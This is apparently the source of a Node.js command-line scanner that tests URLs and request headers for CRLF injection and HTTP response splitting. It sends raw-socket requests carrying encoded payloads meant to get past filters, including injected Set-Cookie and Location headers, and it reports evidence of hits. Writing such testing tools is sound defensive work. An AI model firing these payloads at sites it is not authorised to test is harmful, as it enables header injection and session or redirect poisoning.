// crlfsplit.js — CRLF injection and HTTP response splitting tester.
// Copyright (c) 2026 0xnothings
// @tool crlfsplit
// @desc Test header and parameter injection points for CRLF injection / HTTP response splitting with evidence capture
// @usage node tools/crlfsplit.js https://target/redirect?url=FUZZ --json
// @tags security,web,injection
import net from 'node:net';
import tls from 'node:tls';
import { args, get, num, flag, die, inputLines, table } from '../_lib.js';

const o = args(process.argv.slice(2));
if (o.f.help) {
  console.log(`crlfsplit — CRLF injection / HTTP response splitting tester

  node tools/crlfsplit.js <url-with-FUZZ|list.txt|-> [options]

  Place FUZZ where the payload belongs. Without FUZZ the tool appends a
  test parameter to the query string.

  --header <h>     also inject through this request header (repeatable, comma list)
  --cookie          test headers too (default: on unless --no-header)
  --no-header      query/path injection only
  --timeout <ms>   per-request timeout (default: 8000)
  --delay <ms>     delay between requests (default: 120)
  --json           machine-readable output
  -h, --help       this text

  Example:
    node tools/crlfsplit.js "https://example.com/r?next=FUZZ"
    node tools/crlfsplit.js https://example.com/ --header X-Forwarded-For,Referer`);
  process.exit(0);
}

// process.exit() after a fetch deadlocks libuv on Windows; halting via a thrown
// sentinel keeps the exit code intact without tripping the async handle assert.
class ExitSignal extends Error { constructor() { super('exit-signal'); this.__exitSignal = true; } }
const __exitGuard = (e) => { if (!e || !e.__exitSignal) { process.stderr.write(String(e && e.stack || e) + '\n'); process.exitCode = 1; } };
process.on('uncaughtException', __exitGuard);
process.on('unhandledRejection', __exitGuard);
const exitSoon = (code = 0) => { process.exitCode = code; throw new ExitSignal(); };
const timeout = num(get(o, 'timeout'), 8000);
const delay = num(get(o, 'delay'), 120);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Each payload has an encoder variant so WAFs that block raw CRLF still get tested.
const PAYLOADS = [
  { id: 'raw-crlf', enc: (s) => s, body: '\r\nX-CRLF-Probe: HIT' },
  { id: 'lf-only', enc: (s) => s, body: '\nX-CRLF-Probe: HIT' },
  { id: 'cr-only', enc: (s) => s, body: '\rX-CRLF-Probe: HIT' },
  { id: 'url-encoded', enc: (s) => s, body: '%0d%0aX-CRLF-Probe: HIT' },
  { id: 'double-encoded', enc: (s) => s, body: '%250d%250aX-CRLF-Probe: HIT' },
  { id: 'unicode-encoded', enc: (s) => s, body: '%E5%98%8A%E5%98%8DX-CRLF-Probe: HIT' },
  { id: 'overlong-utf8', enc: (s) => s, body: '%C0%8D%C0%8AX-CRLF-Probe: HIT' },
  { id: 'tab-split', enc: (s) => s, body: '\r\n\tX-CRLF-Probe: HIT' },
  { id: 'space-split', enc: (s) => s, body: '\r\n X-CRLF-Probe: HIT' },
  { id: 'response-split-body', enc: (s) => s, body: '\r\nContent-Length: 12\r\n\r\ncrlf-split-ok' },
  { id: 'response-split-set-cookie', enc: (s) => s, body: '\r\nSet-Cookie: crlfprobe=1; Path=/' },
  { id: 'response-split-location', enc: (s) => s, body: '\r\nLocation: https://crlf-probe.invalid/' },
];

function buildUrl(input, payload) {
  // Raw CRLF payloads must stay literal so they reach the socket unmodified;
  // the %0d%0a-style payloads are already encoded and pass through verbatim.
  const inject = (base) => base.replace(/FUZZ/g, payload.replace(/ /g, '%20'));
  if (input.includes('FUZZ')) return inject(input);
  return `${input}${input.includes('?') ? '&' : '?'}crlfprobe=${payload.replace(/ /g, '%20')}`;
}

async function send(url, headers) {
  // Raw sockets: fetch() rejects control characters in the URL, which is exactly
  // the payload class a CRLF test needs to send.
  let parsed;
  try { parsed = new URL(url); } catch { return { error: 'invalid url' }; }
  const useTls = parsed.protocol === 'https:';
  const port = Number(parsed.port) || (useTls ? 443 : 80);
  const pathWithQuery = `${parsed.pathname || '/'}${parsed.search || ''}`;
  const headLines = [
    `GET ${pathWithQuery} HTTP/1.1`,
    `Host: ${parsed.hostname}`,
    'User-Agent: crlfsplit/1.0',
    ...Object.entries(headers || {}).map(([k, v]) => `${k}: ${v}`),
    'Connection: close',
    '', '',
  ];
  const raw = headLines.join('\r\n');

  return new Promise((resolve) => {
    const chunks = [];
    let done = false;
    const fin = (err) => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      try { sock.destroy(); } catch { /* ignore */ }
      const text = Buffer.concat(chunks).toString('latin1');
      const headEnd = text.indexOf('\r\n\r\n');
      const headBlock = headEnd >= 0 ? text.slice(0, headEnd) : text;
      const body = headEnd >= 0 ? text.slice(headEnd + 4) : '';
      const linesOut = headBlock.split('\r\n');
      const status = Number((linesOut[0] || '').match(/HTTP\/1\.[01]\s+(\d{3})/)?.[1] || 0);
      const hdrs = {};
      for (const line of linesOut.slice(1)) {
        const i = line.indexOf(':');
        if (i > 0) {
          const k = line.slice(0, i).trim().toLowerCase();
          const v = line.slice(i + 1).trim();
          hdrs[k] = hdrs[k] ? `${hdrs[k]}, ${v}` : v;
        }
      }
      resolve({ status, headers: hdrs, body: body.slice(0, 800), len: body.length, raw_head: headBlock.slice(0, 600), error: err });
    };
    let sock;
    const onConnect = () => { try { sock.write(raw); } catch { fin('write failed'); } };
    if (useTls) sock = tls.connect({ host: parsed.hostname, port, servername: parsed.hostname, rejectUnauthorized: false, timeout }, onConnect);
    else sock = net.connect({ host: parsed.hostname, port }, onConnect);
    const timer = setTimeout(() => fin('timeout'), timeout);
    sock.on('data', (c) => { chunks.push(c); if (Buffer.concat(chunks).length > 65536) fin(null); });
    sock.on('error', (e) => fin(e.code || e.message));
    sock.on('close', () => fin(null));
  });
}

function verdictFor(baseline, res, payload) {
  const evidence = [];
  let level = null;
  // A transport error has no headers or body to compare against.
  if (res.error || !res.headers) {
    return { verdict: null, evidence: [`request failed: ${res.error || 'no response headers'}`] };
  }
  const injectedHeader = Object.keys(res.headers).some((k) => k.includes('crlf-probe') || k.includes('x-crlf'));
  if (injectedHeader) { evidence.push(`injected header present: ${Object.keys(res.headers).filter((k) => k.includes('crlf-probe') || k.includes('x-crlf')).join(',')}`); level = 'CRITICAL'; }
  if (!baseline.error && res.status !== baseline.status) { evidence.push(`status changed ${baseline.status} -> ${res.status}`); level = level || 'MEDIUM'; }
  const bLen = baseline.body ? baseline.body.length : 0;
  if (Math.abs(res.body.length - bLen) > 8 && /crlf-split-ok|crlfprobe=1/.test(res.body)) { evidence.push('payload body marker reflected'); level = 'CRITICAL'; }
  for (const h of ['location', 'set-cookie']) {
    const b = baseline.headers?.[h];
    const a = res.headers[h];
    if (a && a !== b && /crlf|probe\.invalid/i.test(a)) { evidence.push(`${h} header poisoned: ${a.slice(0, 120)}`); level = 'HIGH'; }
  }
  if (res.headers['x-crlf-probe'] || res.headers['x-crlf-probe'] === 'HIT') { evidence.push('X-CRLF-Probe header set by server'); level = 'CRITICAL'; }
  if (/x-crlf-probe: hit/i.test(res.body)) { evidence.push('payload reflected unescaped in body'); level = level || 'LOW'; }
  return { verdict: level, evidence };
}

let entries = o._.length ? o._ : ['-'];
let urls = [];
for (const e of entries) {
  if (e === '-' || /\.txt$/.test(e)) urls.push(...(await inputLines(e)));
  else urls.push(e);
}
urls = [...new Set(urls.filter(Boolean).map((u) => (/^https?:\/\//.test(u) ? u : `https://${u}`)))];
if (!urls.length) die('no URL given');

const headerList = String(get(o, 'header', flag(o, 'no-header') ? '' : '')).split(',').map((s) => s.trim()).filter(Boolean);
const doHeader = !flag(o, 'no-header') && !flag(o, 'no-header-only');
const doQuery = !flag(o, 'header-only');

const tests = [];
for (const url of urls) {
  const base = await send(url.includes('FUZZ') ? url.replace(/FUZZ/g, 'baseline') : url, {});
  await sleep(delay);

  if (doQuery) {
    for (const p of PAYLOADS) {
      const target = buildUrl(url, p.body);
      const res = await send(target, {});
      const v = verdictFor(base, res, p);
      tests.push({
        url, vector: url.includes('FUZZ') ? 'url-param(FUZZ)' : 'url-param(crlfprobe)',
        payload_id: p.id, payload: p.body.replace(/\r/g, '\\r').replace(/\n/g, '\\n'),
        status: res.status, verdict: v.verdict, evidence: v.evidence, error: res.error || null, test_url: target,
      });
      await sleep(delay);
    }
  }

  if (doHeader) {
    const hdrs = headerList.length ? headerList : ['X-Forwarded-For', 'Referer', 'X-Forwarded-Host', 'User-Agent'];
    for (const h of hdrs) {
      for (const p of PAYLOADS.slice(0, 6)) {
        const res = await send(url, { [h]: p.body });
        const v = verdictFor(base, res, p);
        tests.push({
          url, vector: `header(${h})`, payload_id: p.id,
          payload: p.body.replace(/\r/g, '\\r').replace(/\n/g, '\\n'),
          status: res.status, verdict: v.verdict, evidence: v.evidence, error: res.error || null, test_url: url,
        });
        await sleep(delay);
      }
    }
  }
}

const hits = tests.filter((t) => t.verdict);
if (flag(o, 'json')) {
  console.log(JSON.stringify({
    generated: new Date().toISOString(),
    url_count: urls.length, tests: tests.length, hits: hits.length,
    findings: hits, all_tests: tests,
  }, null, 2));
  exitSoon(hits.length ? 1 : 0);
}

console.log(table(tests.map((t) => ({
  url: t.url.slice(0, 40), vector: t.vector, payload: t.payload_id,
  status: t.status ?? '', verdict: t.verdict || '-', evidence: (t.evidence[0] || t.error || '').slice(0, 46),
}))));

if (hits.length) {
  console.log(`\n--- EVIDENCE (${hits.length} hit(s)) ---`);
  for (const h of hits) {
    console.log(`\n[${h.verdict}] ${h.vector} / ${h.payload_id}`);
    console.log(`  url    : ${h.test_url}`);
    console.log(`  payload: ${h.payload}`);
    for (const e of h.evidence) console.log(`  proof  : ${e}`);
  }
}
console.log(`\n${tests.length} request(s) sent, ${hits.length} CRLF hit(s)`);
exitSoon(hits.length ? 1 : 0);
